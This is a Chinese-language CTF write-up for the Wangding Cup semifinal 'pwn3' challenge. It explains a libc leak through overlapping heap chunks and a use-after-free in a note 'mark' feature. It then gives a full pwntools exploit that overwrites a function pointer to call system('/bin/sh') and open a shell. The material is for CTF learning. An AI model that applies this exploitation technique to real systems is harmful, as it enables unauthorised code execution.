title: 网鼎杯半决赛pwn3
date: 2018-9-20
categories:
- PWN
---

## 主menu的chara结构体

```
00000000 chara           struc ; (sizeof=0x18, align=0x8, mappedto_7)
00000000 inuse           dq ?
00000008 name_ptr        dq ?
00000010 type            dq ?
00000018 chara           ends
```
- 其中inuse限制了不能edit和double free,程序中没有溢出点
- 虽然inuse可以不能直接读取内存,但是可以利用堆块包含来进行堆块内容的读取
- 可控堆块size的堆,只有name可以利用,然后free到name块,所以通过show来得到\<main_arena+0x88\>,即为libc的基址

## 副menu的结构体

```
00000000 note_count      dd ?
00000004 note_size       dd ?
00000008 name            db 32 dup(?)
00000028 note_content_ptr dq ?
00000030 note            ends
00000030
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 mark_           struc ; (sizeof=0x18, align=0x8, mappedto_6)
00000000 mark_count      dd ?
00000004 mark_index      dd ?
00000008 mark_conect_info dq ?
00000010 funptr          dq ?
00000018 mark_           ends
```

- 这里又实现了一个典型的记事本服务,而且还多了一项mark功能,此函数里有一根函数指针,所以这里考虑劫持函数指针
- mark是0x18,利用第三个QWORD位的函数指针来打印第二个QWORD位的堆块内容
- 并且这个mark存在UAF,我们可以free后利用note部分随意分配size的堆块,再次得到刚才的那个堆块,并直接进行覆盖
- 如果想覆盖到函数指针,必须先覆盖字符串指针,所以要想执行system("/bin/sh"),这里选择note的部分leak_heapbase
- 因为name后紧接着堆块指针,并且字符串尾部没有填0,所以可以leak
- 下面是exp

```python
from pwn import *

p = process("./pwn")
sys_libc = 0x45390
libcmain_arena = 0x3C4B20

def add(size,name):
    p.sendlineafter("Your choice : ","1")
    p.sendlineafter("Length of the name :",str(size))
    p.sendlineafter("The name of character :",name)
    p.sendlineafter("The type of the character :","mozhucy")

def show():
    p.sendlineafter("Your choice : ","2")

def free(index):
    p.sendlineafter("Your choice : ","3")
    p.sendlineafter("Which character do you want to eat:",str(index))

def serect():
    p.sendlineafter("Your choice : ","1337")

def addN(contentsize,name,content):
    p.sendlineafter("$ ","new")
    p.sendlineafter("$ note size:",str(contentsize))
    p.sendlineafter("$ note name:",name)
    p.sendlineafter("$ note content:",content)

def showN(index):
    p.sendlineafter("$ ","show")
    p.sendlineafter("$ note index:",str(index))

def delN(index):
    p.sendlineafter("$ ","delete")
    p.sendlineafter("$ note index:",str(index))

def mark(index,marks):
    p.sendlineafter("$ ","mark")
    p.sendlineafter("$ index of note you want to mark:",str(index))
    if len(marks) == 32:
        p.sendafter("$ mark info:",marks)
    else:
        p.sendlineafter("$ mark info:",marks)

def delmark(index):
    p.sendlineafter("$ ","delete_mark")
    p.sendlineafter("$ mark index:",str(index))

def showmark(index):
    p.sendlineafter("$ ","show_mark")
    p.sendlineafter("$ mark index:",str(index))

def exp():
    #leak
    add(0x80,"1"*0x80)
    add(0x80,"2"*0x80)
    free(0)
    add(0x50,"1111111")
    show()
    p.recvuntil("1111111\n")
    s = p.recv(6) + "\x00\x00"
    mainarena = u64(s)
    libcbase = mainarena - libcmain_arena - 88
    sys = sys_libc + libcbase
    print "system : 0x%x"%sys

    #attack
    serect()
    addN(0x30,"flag"*8,"a"*0x30)
    mark(0,"/bin/sh\x00")
    delmark(0)
    showmark(0)
    showN(0)
    # print p.recv()
    p.recvuntil("flagflagflagflagflagflagflagflag")
    heapbase = u64(p.recv(6)+'\x00\x00')
    print "/bin/sh : %x"%(heapbase + 0x60)
    payload = p64(0) + p64(heapbase + 0x60) + p64(sys)
    addN(0x18,"attack",payload)
    showmark(0)
    p.interactive()
    
    # showmark(0)
    # p.interactive()

if __name__ == "__main__":
    exp()
```